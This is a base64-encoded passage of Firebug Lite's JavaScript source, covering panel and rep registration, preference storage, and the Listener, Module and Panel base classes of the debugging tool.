bWVudHNbaV07ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgcGFuZWxUeXBlTWFwW3BhbmVsVHlwZS5wcm90b3R5cGUubmFtZV0gPSBhcmd1bWVudHNbaV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChwYW5lbFR5cGUucHJvdG90eXBlLnBhcmVudFBhbmVsKQ0KICAgICAgICAgICAgICAgIHBhcmVudFBhbmVsTWFwW3BhbmVsVHlwZS5wcm90b3R5cGUucGFyZW50UGFuZWxdID0gMTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0lOSVRJQUxJWkUpDQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3VtZW50cy5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiRmlyZWJ1Zy5yZWdpc3RlclBhbmVsIiwgYXJndW1lbnRzW2ldLnByb3RvdHlwZS5uYW1lKTsNCiAgICB9LA0KICAgIA0KICAgIHJlZ2lzdGVyUmVwOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZXBzLnB1c2guYXBwbHkocmVwcywgYXJndW1lbnRzKTsNCiAgICB9LA0KDQogICAgdW5yZWdpc3RlclJlcDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcmd1bWVudHMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICByZW1vdmUocmVwcywgYXJndW1lbnRzW2ldKTsNCiAgICB9LA0KDQogICAgc2V0RGVmYXVsdFJlcHM6IGZ1bmN0aW9uKGZ1bmNSZXAsIHJlcCkNCiAgICB7DQogICAgICAgIEZCTC5kZWZhdWx0UmVwID0gcmVwOw0KICAgICAgICBGQkwuZGVmYXVsdEZ1bmNSZXAgPSBmdW5jUmVwOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gUmVwcw0KDQogICAgZ2V0UmVwOiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICB2YXIgdHlwZSA9IHR5cGVvZiBvYmplY3Q7DQogICAgICAgIGlmIChpc0lFICYmIGlzRnVuY3Rpb24ob2JqZWN0KSkNCiAgICAgICAgICAgIHR5cGUgPSAiZnVuY3Rpb24iOw0KICAgICAgICANCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCByZXBzLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcmVwID0gcmVwc1tpXTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChyZXAuc3VwcG9ydHNPYmplY3Qob2JqZWN0LCB0eXBlKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19ET00pDQogICAgICAgICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZ2V0UmVwIHR5cGU6ICIrdHlwZSsiIG9iamVjdDogIitvYmplY3QsIHJlcCk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImZpcmVidWcuZ2V0UmVwIEZBSUxTOiAiLCBleGMubWVzc2FnZSB8fCBleGMpOw0KICAgICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZmlyZWJ1Zy5nZXRSZXAgcmVwc1siK2krIi8iK3JlcHMubGVuZ3RoKyJdOiBSZXA9IityZXBzW2ldLmNsYXNzTmFtZSk7DQogICAgICAgICAgICAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIGFkZCB0cmFjZSB0byBGQlRyYWNlIGxvZ3MgbGlrZSBpbiBGaXJlYnVnDQogICAgICAgICAgICAgICAgICAgIC8vZmlyZWJ1Zy50cmFjZSgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAodHlwZSA9PSAnZnVuY3Rpb24nKSA/IGRlZmF1bHRGdW5jUmVwIDogZGVmYXVsdFJlcDsNCiAgICB9LA0KDQogICAgZ2V0UmVwT2JqZWN0OiBmdW5jdGlvbihub2RlKQ0KICAgIHsNCiAgICAgICAgdmFyIHRhcmdldCA9IG51bGw7DQogICAgICAgIGZvciAodmFyIGNoaWxkID0gbm9kZTsgY2hpbGQ7IGNoaWxkID0gY2hpbGQucGFyZW50Tm9kZSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKGhhc0NsYXNzKGNoaWxkLCAicmVwVGFyZ2V0IikpDQogICAgICAgICAgICAgICAgdGFyZ2V0ID0gY2hpbGQ7DQoNCiAgICAgICAgICAgIGlmIChjaGlsZC5yZXBPYmplY3QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKCF0YXJnZXQgJiYgaGFzQ2xhc3MoY2hpbGQsICJyZXBJZ25vcmUiKSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gY2hpbGQucmVwT2JqZWN0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGdldFJlcE5vZGU6IGZ1bmN0aW9uKG5vZGUpDQogICAgew0KICAgICAgICBmb3IgKHZhciBjaGlsZCA9IG5vZGU7IGNoaWxkOyBjaGlsZCA9IGNoaWxkLnBhcmVudE5vZGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChjaGlsZC5yZXBPYmplY3QpDQogICAgICAgICAgICAgICAgcmV0dXJuIGNoaWxkOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGdldEVsZW1lbnRCeVJlcE9iamVjdDogZnVuY3Rpb24oZWxlbWVudCwgb2JqZWN0KQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgY2hpbGQgPSBlbGVtZW50LmZpcnN0Q2hpbGQ7IGNoaWxkOyBjaGlsZCA9IGNoaWxkLm5leHRTaWJsaW5nKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoY2hpbGQucmVwT2JqZWN0ID09IG9iamVjdCkNCiAgICAgICAgICAgICAgICByZXR1cm4gY2hpbGQ7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBQcmVmZXJlbmNlcw0KICAgIA0KICAgIGdldFByZWY6IGZ1bmN0aW9uKG5hbWUpDQogICAgew0KICAgICAgICByZXR1cm4gRmlyZWJ1Z1tuYW1lXTsNCiAgICB9LA0KICAgIA0KICAgIHNldFByZWY6IGZ1bmN0aW9uKG5hbWUsIHZhbHVlKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Z1tuYW1lXSA9IHZhbHVlOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5zYXZlUHJlZnMoKTsNCiAgICB9LA0KICAgIA0KICAgIHNldFByZWZzOiBmdW5jdGlvbihwcmVmcykNCiAgICB7DQogICAgICAgIGZvciAodmFyIG5hbWUgaW4gcHJlZnMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChwcmVmcy5oYXNPd25Qcm9wZXJ0eShuYW1lKSkNCiAgICAgICAgICAgICAgICBGaXJlYnVnW25hbWVdID0gcHJlZnNbbmFtZV07DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIEZpcmVidWcuc2F2ZVByZWZzKCk7DQogICAgfSwNCiAgICANCiAgICByZXN0b3JlUHJlZnM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBPcHRpb25zID0gRW52LkRlZmF1bHRPcHRpb25zOw0KICAgICAgICANCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBPcHRpb25zKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnW25hbWVdID0gT3B0aW9uc1tuYW1lXTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgbG9hZFByZWZzOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB0aGlzLnJlc3RvcmVQcmVmcygpOw0KICAgICAgICANCiAgICAgICAgdmFyIHByZWZzID0gU3RvcmUuZ2V0KCJGaXJlYnVnTGl0ZSIpIHx8IHt9Ow0KICAgICAgICB2YXIgb3B0aW9ucyA9IHByZWZzLm9wdGlvbnM7DQogICAgICAgIHZhciBwZXJzaXN0ZWRTdGF0ZSA9IHByZWZzLnBlcnNpc3RlZFN0YXRlIHx8IEZCTC5kZWZhdWx0UGVyc2lzdGVkU3RhdGU7DQogICAgICAgIA0KICAgICAgICBmb3IgKHZhciBuYW1lIGluIG9wdGlvbnMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChvcHRpb25zLmhhc093blByb3BlcnR5KG5hbWUpKQ0KICAgICAgICAgICAgICAgIEZpcmVidWdbbmFtZV0gPSBvcHRpb25zW25hbWVdOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAoRmlyZWJ1Zy5jb250ZXh0ICYmIHBlcnNpc3RlZFN0YXRlKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlID0gcGVyc2lzdGVkU3RhdGU7DQogICAgfSwNCiAgICANCiAgICBzYXZlUHJlZnM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBwcmVmcyA9IHsNCiAgICAgICAgICAgIG9wdGlvbnM6IHt9DQogICAgICAgIH07DQogICAgICAgIA0KICAgICAgICB2YXIgRW52T3B0aW9ucyA9IEVudi5PcHRpb25zOw0KICAgICAgICB2YXIgb3B0aW9ucyA9IHByZWZzLm9wdGlvbnM7DQogICAgICAgIGZvciAodmFyIG5hbWUgaW4gRW52T3B0aW9ucykNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKEVudk9wdGlvbnMuaGFzT3duUHJvcGVydHkobmFtZSkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgb3B0aW9uc1tuYW1lXSA9IEZpcmVidWdbbmFtZV07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHZhciBwZXJzaXN0ZWRTdGF0ZSA9IEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZTsNCiAgICAgICAgaWYgKCFwZXJzaXN0ZWRTdGF0ZSkNCiAgICAgICAgew0KICAgICAgICAgICAgcGVyc2lzdGVkU3RhdGUgPSBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUgPSBGQkwuZGVmYXVsdFBlcnNpc3RlZFN0YXRlOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBwcmVmcy5wZXJzaXN0ZWRTdGF0ZSA9IHBlcnNpc3RlZFN0YXRlOw0KICAgICAgICANCiAgICAgICAgU3RvcmUuc2V0KCJGaXJlYnVnTGl0ZSIsIHByZWZzKTsNCiAgICB9LA0KICAgIA0KICAgIGVyYXNlUHJlZnM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIFN0b3JlLnJlbW92ZSgiRmlyZWJ1Z0xpdGUiKTsNCiAgICAgICAgdGhpcy5yZXN0b3JlUHJlZnMoKTsNCiAgICB9DQp9Ow0KDQpGaXJlYnVnLnJlc3RvcmVQcmVmcygpOw0KDQovLyB4eHhwZWRybyBzaG91bGQgd2UgcmVtb3ZlIHRoaXM/DQp3aW5kb3cuRmlyZWJ1ZyA9IEZCTC5GaXJlYnVnOw0KDQppZiAoIUVudi5PcHRpb25zLmVuYWJsZVBlcnNpc3RlbnQgfHwNCiAgICAgRW52Lk9wdGlvbnMuZW5hYmxlUGVyc2lzdGVudCAmJiBFbnYuaXNDaHJvbWVDb250ZXh0IHx8IA0KICAgICBFbnYuaXNEZWJ1Z01vZGUpDQogICAgICAgIEVudi5icm93c2VyLndpbmRvdy5GaXJlYnVnID0gRkJMLkZpcmVidWc7IA0KDQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCi8vIE90aGVyIG1ldGhvZHMNCg0KRkJMLmNhY2hlRG9jdW1lbnQgPSBmdW5jdGlvbiBjYWNoZURvY3VtZW50KCkNCnsNCiAgICB2YXIgRWxlbWVudENhY2hlID0gRmlyZWJ1Zy5MaXRlLkNhY2hlLkVsZW1lbnQ7DQogICAgdmFyIGVscyA9IEZpcmVidWcuYnJvd3Nlci5kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiKiIpOw0KICAgIGZvciAodmFyIGk9MCwgbD1lbHMubGVuZ3RoLCBlbDsgaTxsOyBpKyspDQogICAgew0KICAgICAgICBlbCA9IGVsc1tpXTsNCiAgICAgICAgRWxlbWVudENhY2hlKGVsKTsNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLyoqDQogKiBAY2xhc3MNCiAqICANCiAqIFN1cHBvcnQgZm9yIGxpc3RlbmVycyByZWdpc3RyYXRpb24uIFRoaXMgb2JqZWN0IGFsc28gZXh0ZW5kZWQgYnkgRmlyZWJ1Zy5Nb2R1bGUgc28sDQogKiBhbGwgbW9kdWxlcyBzdXBwb3J0cyBsaXN0ZW5pbmcgYXV0b21hdGljYWxseS4gTm90aWNlIHRoYXQgYXJyYXkgb2YgbGlzdGVuZXJzDQogKiBpcyBjcmVhdGVkIGZvciBlYWNoIGludGFuY2Ugb2YgYSBtb2R1bGUgd2l0aGluIGluaXRpYWxpemUgbWV0aG9kLiBUaHVzIGFsbCBkZXJpdmVkDQogKiBtb2R1bGUgY2xhc3NlcyBtdXN0IGVuc3VyZSB0aGF0IEZpcmVidWcuTW9kdWxlLmluaXRpYWxpemUgbWV0aG9kIGlzIGNhbGxlZCBmb3IgdGhlDQogKiBzdXBlciBjbGFzcy4NCiAqLw0KRmlyZWJ1Zy5MaXN0ZW5lciA9IGZ1bmN0aW9uKCkNCnsNCiAgICAvLyBUaGUgYXJyYXkgaXMgY3JlYXRlZCB3aGVuIHRoZSBmaXJzdCBsaXN0ZW5lcnMgaXMgYWRkZWQuDQogICAgLy8gSXQgY2FuJ3QgYmUgY3JlYXRlZCBoZXJlIHNpbmNlIGRlcml2ZWQgb2JqZWN0cyB3b3VsZCBzaGFyZQ0KICAgIC8vIHRoZSBzYW1lIGFycmF5Lg0KICAgIHRoaXMuZmJMaXN0ZW5lcnMgPSBudWxsOw0KfTsNCg0KRmlyZWJ1Zy5MaXN0ZW5lci5wcm90b3R5cGUgPQ0Kew0KICAgIGFkZExpc3RlbmVyOiBmdW5jdGlvbihsaXN0ZW5lcikNCiAgICB7DQogICAgICAgIGlmICghdGhpcy5mYkxpc3RlbmVycykNCiAgICAgICAgICAgIHRoaXMuZmJMaXN0ZW5lcnMgPSBbXTsgLy8gZGVsYXkgdGhlIGNyZWF0aW9uIHVudGlsIHRoZSBvYmplY3RzIGFyZSBjcmVhdGVkIHNvICd0aGlzJyBjYXVzZXMgbmV3IGFycmF5IGZvciBlYWNoIG1vZHVsZQ0KDQogICAgICAgIHRoaXMuZmJMaXN0ZW5lcnMucHVzaChsaXN0ZW5lcik7DQogICAgfSwNCg0KICAgIHJlbW92ZUxpc3RlbmVyOiBmdW5jdGlvbihsaXN0ZW5lcikNCiAgICB7DQogICAgICAgIHJlbW92ZSh0aGlzLmZiTGlzdGVuZXJzLCBsaXN0ZW5lcik7ICAvLyBpZiB0aGlzLmZiTGlzdGVuZXJzIGlzIG51bGwsIHJlbW92ZSBpcyBiZWluZyBjYWxsZWQgd2l0aCBubyBhZGQNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIE1vZHVsZQ0KDQovKioNCiAqIEBtb2R1bGUgQmFzZSBjbGFzcyBmb3IgYWxsIG1vZHVsZXMuIEV2ZXJ5IGRlcml2ZWQgbW9kdWxlIG9iamVjdCBtdXN0IGJlIHJlZ2lzdGVyZWQgdXNpbmcNCiAqIDxjb2RlPkZpcmVidWcucmVnaXN0ZXJNb2R1bGU8L2NvZGU+IG1ldGhvZC4gVGhlcmUgaXMgYWx3YXlzIG9uZSBpbnN0YW5jZSBvZiBhIG1vZHVsZSBvYmplY3QNCiAqIHBlciBicm93c2VyIHdpbmRvdy4NCiAqIEBleHRlbmRzIEZpcmVidWcuTGlzdGVuZXIgDQogKi8NCkZpcmVidWcuTW9kdWxlID0gZXh0ZW5kKG5ldyBGaXJlYnVnLkxpc3RlbmVyKCksDQovKiogQGV4dGVuZCBGaXJlYnVnLk1vZHVsZSAqLw0Kew0KICAgIC8qKg0KICAgICAqIENhbGxlZCB3aGVuIHRoZSB3aW5kb3cgaXMgb3BlbmVkLg0KICAgICAqLw0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgfSwNCiAgDQogICAgLyoqDQogICAgICogQ2FsbGVkIHdoZW4gdGhlIHdpbmRvdyBpcyBjbG9zZWQuDQogICAgICovDQogICAgc2h1dGRvd246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgfSwNCiAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICANCiAgICAvKioNCiAgICAgKiBDYWxsZWQgd2hlbiBhIG5ldyBjb250ZXh0IGlzIGNyZWF0ZWQgYnV0IGJlZm9yZSB0aGUgcGFnZSBpcyBsb2FkZWQuDQogICAgICovDQogICAgaW5pdENvbnRleHQ6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgIH0sDQogIA0KICAgIC8qKg0KICAgICAqIENhbGxlZCBhZnRlciBhIGNvbnRleHQgaXMgZGV0YWNoZWQgdG8gYSBzZXBhcmF0ZSB3aW5kb3c7DQogICAgICovDQogICAgcmVhdHRhY2hDb250ZXh0OiBmdW5jdGlvbihicm93c2VyLCBjb250ZXh0KQ0KICAgIHsNCiAgICB9LA0KICANCiAgICAvKioNCiAgICAgKiBDYWxsZWQgd2hlbiBhIGNvbnRleHQgaXMgZGVzdHJveWVkLiBNb2R1bGUgbWF5IHN0b3JlIGluZm8gb24gcGVyc2lzdGVkU3RhdGUgZm9yIHJlbG9hZGVkIHBhZ2VzLg0KICAgICAqLw0KICAgIGRlc3Ryb3lDb250ZXh0OiBmdW5jdGlvbihjb250ZXh0LCBwZXJzaXN0ZWRTdGF0ZSkNCiAgICB7DQogICAgfSwNCiAgDQogICAgLy8gQ2FsbGVkIHdoZW4gYSBGRiB0YWIgaXMgY3JlYXRlIG9yIGFjdGl2YXRlZCAodXNlciBjaGFuZ2VzIEZGIHRhYikNCiAgICAvLyBDYWxsZWQgYWZ0ZXIgY29udGV4dCBpcyBjcmVhdGVkIG9yIHdpdGggY29udGV4dCA9PSBudWxsICh0byBhYm9ydD8pDQogICAgc2hvd0NvbnRleHQ6IGZ1bmN0aW9uKGJyb3dzZXIsIGNvbnRleHQpDQogICAgew0KICAgIH0sDQogIA0KICAgIC8qKg0KICAgICAqIENhbGxlZCBhZnRlciBhIGNvbnRleHQncyBwYWdlIGdldHMgRE9NQ29udGVudExvYWRlZA0KICAgICAqLw0KICAgIGxvYWRlZENvbnRleHQ6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgIH0sDQogIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgDQogICAgc2hvd1BhbmVsOiBmdW5jdGlvbihicm93c2VyLCBwYW5lbCkNCiAgICB7DQogICAgfSwNCiAgDQogICAgc2hvd1NpZGVQYW5lbDogZnVuY3Rpb24oYnJvd3NlciwgcGFuZWwpDQogICAgew0KICAgIH0sDQogIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgDQogICAgdXBkYXRlT3B0aW9uOiBmdW5jdGlvbihuYW1lLCB2YWx1ZSkNCiAgICB7DQogICAgfSwNCiAgDQogICAgZ2V0T2JqZWN0QnlVUkw6IGZ1bmN0aW9uKGNvbnRleHQsIHVybCkNCiAgICB7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gUGFuZWwNCg0KLyoqDQogKiBAcGFuZWwgQmFzZSBjbGFzcyBmb3IgYWxsIHBhbmVscy4gRXZlcnkgZGVyaXZlZCBwYW5lbCBtdXN0IGRlZmluZSBhIGNvbnN0cnVjdG9yIGFuZA0KICogcmVnaXN0ZXIgd2l0aCAiRmlyZWJ1Zy5yZWdpc3RlclBhbmVsIiBtZXRob2QuIEFuIGluc3RhbmNlIG9mIHRoZSBwYW5lbA0KICogb2JqZWN0IGlzIGNyZWF0ZWQgYnkgdGhlIGZyYW1ld29yayBmb3IgZWFjaCBicm93c2VyIHRhYiB3aGVyZSBGaXJlYnVnIGlzIGFjdGl2YXRlZC4NCiAqLw0KRmlyZWJ1Zy5QYW5lbCA9DQp7DQogICAgbmFtZTogIkhlbGxvV29ybGQiLA0KICAgIHRpdGxlOiAiSGVsbG8gV29ybGQhIiwNCiAgICANCiAgICBwYXJlbnRQYW5lbDogbnVsbCwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgb3B0aW9uczogew0KICAgICAgICBoYXNDb21tYW5kTGluZTogZmFsc2UsDQogICAgICAgIGhhc1N0YXR1c0JhcjogZmFsc2UsDQogICAgICAgIGhhc1Rvb2xCdXR0b25zOiBmYWxzZSwNCiAgICAgICAgDQogICAgICAgIC8vIFByZS1yZW5kZXJlZCBwYW5lbHMgYXJlIHRob3NlIGluY2x1ZGVkIGluIHRoZSBza2luIGZpbGUgKGZpcmVidWcuaHRtbCkNCiAgICAgICAgaXNQcmVSZW5kZXJlZDogZmFsc2UsDQogICAgICAgIGlubmVySFRNTFN5bmM6IGZhbHNlDQogICAgICAgIA0KICAgICAgICAvKg0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gVG8gYmUgdXNlZCBieSBleHRlcm5hbCBleHRlbnNpb25zDQogICAgICAgIHBhbmVsSFRNTDogIiIsDQogICAgICAgIHBhbmVsQ1NTOiAiIiwNCiAgICAgICAgDQogICAgICAgIHRvb2xCdXR0b25zSFRNTDogIiINCiAgICAgICAgLyoqLw0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIHRhYk5vZGU6IG51bGwsDQogICAgcGFuZWxOb2RlOiBudWxsLA0KICAgIHNpZGVQYW5lbE5vZGU6IG51bGwsDQogICAgc3RhdHVzQmFyTm9kZTogbnVsbCwNCiAgICB0b29sQnV0dG9uc05vZGU6IG51bGwsDQoNCiAgICBwYW5lbEJhck5vZGU6IG51bGwsDQogICAgDQogICAgc2lkZVBhbmVsQmFyQm94Tm9kZTogbnVsbCwNCiAgICBzaWRlUGFuZWxCYXJOb2RlOiBudWxsLCAgICAgICAgICAgIA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICBzaWRlUGFuZWxCYXI6IG51bGwsDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIHNlYXJjaGFibGU6IGZhbHNlLA0KICAgIGVkaXRhYmxlOiB0cnVlLA0KICAgIG9yZGVyOiAyMTQ3NDgzNjQ3LA0KICAgIHN0YXR1c1NlcGFyYXRvcjogIjwiLA0KICAgIA0KICAgIGNyZWF0ZTogZnVuY3Rpb24oY29udGV4dCwgZG9jKQ0KICAgIHsNCiAgICAgICAgdGhpcy5oYXNTaWRlUGFuZWwgPSBwYXJlbnRQYW5lbE1hcC5oYXNPd25Qcm9wZXJ0eSh0aGlzLm5hbWUpOyANCiAgICAgICAgDQogICAgICAgIHRoaXMucGFuZWxCYXJOb2RlID0gJCgiZmJQYW5lbEJhcjEiKTsNCiAgICAgICAgdGhpcy5zaWRlUGFuZWxCYXJCb3hOb2RlID0gJCgiZmJQYW5lbEJhcjIiKTsNCiAgICAgICAgDQogICAgICAgIGlmICh0aGlzLmhhc1NpZGVQYW5lbCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5zaWRlUGFuZWxCYXIgPSBleHRlbmQoe30sIFBhbmVsQmFyKTsNCiAgICAgICAgICAgIHRoaXMuc2lkZVBhbmVsQmFyLmNyZWF0ZSh0aGlzKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdmFyIG9wdGlvbnMgPSB0aGlzLm9wdGlvbnMgPSBleHRlbmQoRmlyZWJ1Zy5QYW5lbC5vcHRpb25zLCB0aGlzLm9wdGlvbnMpOw0KICAgICAgICB2YXIgcGFuZWxJZCA9ICJmYiIgKyB0aGlzLm5hbWU7DQogICAgICAgIA0KICAgICAgICBpZiAob3B0aW9ucy5pc1ByZVJlbmRlcmVkKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnBhbmVsTm9kZSA9ICQocGFuZWxJZCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMudGFiTm9kZSA9ICQocGFuZWxJZCArICJUYWIiKTsNCiAgICAgICAgICAgIHRoaXMudGFiTm9kZS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKG9wdGlvbnMuaGFzVG9vbEJ1dHRvbnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy50b29sQnV0dG9uc05vZGUgPSAkKHBhbmVsSWQgKyAiQnV0dG9ucyIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAob3B0aW9ucy5oYXNTdGF0dXNCYXIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy5zdGF0dXNCYXJCb3ggPSAkKCJmYlN0YXR1c0JhckJveCIpOw0KICAgICAgICAgICAgICAgIHRoaXMuc3RhdHVzQmFyTm9kZSA9ICQocGFuZWxJZCArICJTdGF0dXNCYXIiKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBjb250YWluZXJTdWZpeCA9IHRoaXMucGFyZW50UGFuZWwgPyAiMiIgOiAiMSI7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgICAgICAvLyBDcmVhdGUgUGFuZWwNCiAgICAgICAgICAgIHZhciBwYW5lbE5vZGUgPSB0aGlzLnBhbmVsTm9kZSA9IGNyZWF0ZUVsZW1lbnQoImRpdiIsIHsNCiAgICAgICAgICAgICAgICBpZDogcGFuZWxJZCwNCiAgICAgICAgICAgICAgICBjbGFzc05hbWU6ICJmYlBhbmVsIg0KICAgICAgICAgICAgfSk7DQoNCiAgICAgICAgICAgICQoImZiUGFuZWwiICsgY29udGFpbmVyU3VmaXgpLmFwcGVuZENoaWxkKHBhbmVsTm9kZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgICAgICAvLyBDcmVhdGUgUGFuZWwgVGFiDQogICAgICAgICAgICB2YXIgdGFiSFRNTCA9ICc8c3BhbiBjbGF